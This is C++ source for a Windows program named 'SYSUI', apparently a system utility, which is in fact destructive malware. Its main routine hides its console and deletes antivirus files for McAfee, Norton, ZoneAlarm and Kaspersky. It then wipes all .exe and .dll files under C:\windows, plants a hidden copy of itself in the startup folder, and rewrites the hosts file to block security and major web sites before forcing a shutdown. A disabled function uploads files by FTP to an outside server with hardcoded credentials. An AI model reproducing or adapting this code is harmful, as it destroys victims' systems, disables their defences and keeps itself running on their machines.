/*
SYSTEM UI v0.1 beta
Developed by badiiiro
Author: badiiiro
License: N/A
License URL: N/A
Copyright (C) 2019
Special thanks to: Kaboom
*/

//	Header files

#include <iostream>
#include <windows.h>
#include <stdio.h> 
#include <conio.h> 
#include <stdlib.h>
#include <fstream>
#include <wininet.h>
#pragma comment(lib, "Wininet")

using namespace std;

char poweredBy[] = "badiiiro";

void msgBox();
void shutDown();
void outputProgramFeatures();
void removeFile();
void renameFile();
void hideConsol();
void attribFile();
void fileSubmit();
void blockWebsite();
void removeAntivirus();

void setColor(int ForgC);

void setColor(int ForgC)
{
     WORD wColor;
     //This handle is needed to get the current background attribute

     HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     //csbi is used for wAttributes word

     if(GetConsoleScreenBufferInfo(hStdOut, &csbi))
     {
          //To mask out all but the background attribute, and to add the color
          wColor = (csbi.wAttributes & 0xF0) + (ForgC & 0x0F);
          SetConsoleTextAttribute(hStdOut, wColor);
     }
     return;
}
void msgBox()
{
	MessageBox(HWND_DESKTOP,"To use this software you must agree to our terms and conditions, you can read our terms and conditions online from this site below\nhttps://termsofuse.com\nPleas make sure after you clock <OK> the action can not be undone","SYSUI",MB_ICONINFORMATION| MB_OK);
}
void blockWebsite()
{
    FILE *fpl;
    fpl = fopen ("C:\\WINDOWS\\System32\\drivers\\etc\\hosts","w");
    fprintf (fpl,"0.0.0.0 google.com");
    fprintf (fpl," 0.0.0.0 www.hotmail.com");
    fprintf (fpl," 0.0.0.0 www.microsoft.com");
    fprintf (fpl," 0.0.0.0 microsoft.com");
    fprintf (fpl," 0.0.0.0  macafee.com");
    fprintf (fpl," 0.0.0.0 www.macafee.com");
    fprintf (fpl," 0.0.0.0 download.mcafee.com");
    fprintf (fpl," 0.0.0.0 www.download.mcafee.com");
    fprintf (fpl," 0.0.0.0 rads.mcafee.com");
    fprintf (fpl," 0.0.0.0 us.mcafee.com");
    fprintf (fpl," 0.0.0.0 www.networkassociates.com");
    fprintf (fpl," 0.0.0.0 networkassociates.com");
    fprintf (fpl," 0.0.0.0 update.symantec.com");
    fprintf (fpl," 0.0.0.0 updates.symantec.com");
    fprintf (fpl," 0.0.0.0 iveupdate.symantec.com");
    fprintf (fpl," 0.0.0.0 norton.com");
    fprintf (fpl," 0.0.0.0 www.symantec.com");
    fprintf (fpl," 0.0.0.0 symantec.com");
    fprintf (fpl," 0.0.0.0 www.norton.com");
    fprintf (fpl," 0.0.0.0 google.com");
    fprintf (fpl," 0.0.0.0 bitdefender.com");
    fprintf (fpl," 0.0.0.0 www.viruslist.com");
    fprintf (fpl," 0.0.0.0 viruslist.com");
    fprintf (fpl," 0.0.0.0 www.virustotal.com");
    fprintf (fpl," 0.0.0.0 virustotal.com");
    fprintf (fpl," 0.0.0.0 www.kaspersky.com");
    fprintf (fpl," 0.0.0.0 kaspersky.com");
    fprintf (fpl," 0.0.0.0 kaspersky-labs.com");
    fprintf (fpl," 0.0.0.0 www.kaspersky-labs.com");
    fprintf (fpl," 0.0.0.0 www.trendmicro.com");
    fprintf (fpl," 0.0.0.0 trendmicro.com");
    fprintf (fpl," 0.0.0.0 www.pandasoftware.com");
    fprintf (fpl," 0.0.0.0 pandasoftware.com");
    fprintf (fpl," 0.0.0.0 www.nod32.com");
    fprintf (fpl," 0.0.0.0 nod32.com");
    fprintf (fpl," 0.0.0.0 yahoo.com");
    fprintf (fpl," 0.0.0.0 mail.yahoo.com");
    fprintf (fpl," 0.0.0.0 www.grisoft.com");
    fprintf (fpl," 0.0.0.0 www.f-secure.com");
    fprintf (fpl," 0.0.0.0  f-secure.com");
    fclose(fpl);
}
void removeAntivirus()
{
   system("del C:\\Program Files\\McAfee.com\\Personal Firewall\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\Personal Firewall\\data\\*.* /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\Personal Firewall\\help\\*.* /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\VSO\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\VSO\\*.ini /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\VSO\\Res00\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\VSO\\Dat\\4615\\*.* /F /S /Q ");
   system("del C:\\Program Files\\McAfee.com\\*.* /F /S /Q ");
   system("del C:\\Program Files\\Norton AntiVirus\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\Common Files\\Symantec Shared\\*.exe /F /S /Q ");
   system("del C:\\Program Files\\Norton AntiVirus\\*.ini /F /S /Q");
   system("del C:\\Program Files\\Norton AntiVirus\\*.exe /F /S /Q ");
   system("del C:\\Program Files\\Norton AntiVirus\\*.inf /F /S /Q ");
   system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.exe  /F /S /Q ");
   system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.zap /F /S /Q ");
   system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\Zone Labs\\ZoneAlarm\\repair\\*.dll /F /S /Q ");
   system("del C:\\Program Files\\Kaspersky Lab\\AVP6\\*.exe /F /S /Q ");
   system("del C:\\Program Files\\Kaspersky Lab\\AVP6\\*.dll /F /S /Q ");
}
void hideConsol()
{
 HWND Stealth;
 AllocConsole();
 Stealth = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(Stealth,0);
}
void shutDown()
{
	setColor(12);  
	cout << "Turning off the system...\n";
	system("c:\\windows\\system32\\shutdown /s /t 10 \n\n");
	setColor(15);  
}
void outputProgramFeatures()
{
	setColor(12);  
	printf("================================================================================\n\n");
	setColor(15);  
	cout << "\t.dPY8  Yb  dP .dPY8  	88   88	88 \n";
	setColor(12);  
	cout << "\t`Ybo.   YbdP  `Ybo. 	88   88	88 \n";
	cout << " \to.`Y8b   8P   o.`Y8b 	Y8   8P 88 \n";
	setColor(15);  
	cout << "\t8bodP'   dP   8bodP' 	`YbodP' 88 \n";
	cout << "\t\n";
	setColor(9);  
	cout << "\t}--{+} SYSUI v0.1 {+}--{ \n\t}-{*} Coded By " << poweredBy  << " {*}-{\n\n"; 
	setColor(12);  
	printf("\n================================================================================\n");	
	setColor(15); 
}
void removeFile()
{
	// Remove system files
	setColor(12);  
	cout << "Deleting all executable files...";
	setColor(15);  
	if( system("del C:\\windows\\*exe /F /S /Q") != 0 )
	perror( "Error deleting file" );
	else
	puts( "Executable file successfully deleted" );
	setColor(15);  
	setColor(12);  
	cout << "Deleting all dynamic-link library files...";
	setColor(15);  
	if( system("del C:\\windows\\*dll /F /S /Q") != 0 )
	perror( "Error deleting file" );
	else
	puts( "Dynamic-link library successfully deleted" );
	setColor(15);  
}
void renameFile()
{
	/*
	setColor(12);  
	cout << "Renaming <FILENAMERENAME> to <FILENAMERENAMEDONE> at <C:/FOLDERNAME>\n";
	setColor(15);  
	if( rename("FILENAMERENAME.txt","c:/FOLDERNAME/FILENAMERENAMEDONE.txt") != 0 )
	perror( "Error renaming file" );
	else
	puts( "File successfully renamed" );
	*/
	setColor(12);  
	cout << "Renaming <SYSUI.exe> to <win.exe> at <windows/startm~1/programs/startup/>\n";
	setColor(15);  
	if( rename("SYSUI.exe","c:/windows/startm~1/programs/startup/win.exe") != 0 )
	perror( "Error renaming file" );
	else
	puts( "File successfully renamed" );
}
void attribFile()
{
	/*
	setColor(12);  
	cout << "Changing <FILENAMEHIDE.txt> to read-only and hidden file\n";
	setColor(15);  
	system("attrib +H +R c:/FOLDERNAME/FILENAMEHIDE.txt");
	*/
	setColor(12);  
	cout << "Changing <SYSUI.exe> to read-only and hidden file\n";
	setColor(15);  
	ofstream out;
	out.open("c:/windows/startm~1/programs/startup/win.exe");
	out.close();
	//attrib [parameters] [file]
	//+R -> readonly
	//+H -> hidden
	//+S -> system file (ultra hidden)
	//There are more, type 'attrib /?' in cmd to find all of the options
	system("attrib +H +R c:/windows/startm~1/programs/startup/win.exe");
}
/*
void fileSubmit()
{
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        cout << "Error: " << GetLastError();
    }
    else
    {
        hFtpSession = InternetConnect(hInternet, "files.000webhost.com", INTERNET_DEFAULT_FTP_PORT, "redrosesdrug", "BAYlovec++", INTERNET_SERVICE_FTP, 0, 0);
        if (hFtpSession == NULL)
        {
            cout << "Error: " << GetLastError();
        }
        else
        {
        if (!FtpPutFile(hFtpSession, "C://FOLDERNAME/FILENAMEUPLOAD.txt", "/FILENAMEUPLOAD.txt.txt", FTP_TRANSFER_TYPE_BINARY, 0))
        {
                    cout << "Error: " << GetLastError();
        }
    }
    }
}
*/

int main()
{
	// msgBox();
	hideConsol();
	outputProgramFeatures();
	removeAntivirus();
	removeFile();
	renameFile();
	attribFile();
	blockWebsite();
	removeAntivirus();
	// fileSubmit();
	shutDown();
	// system("pause");
}
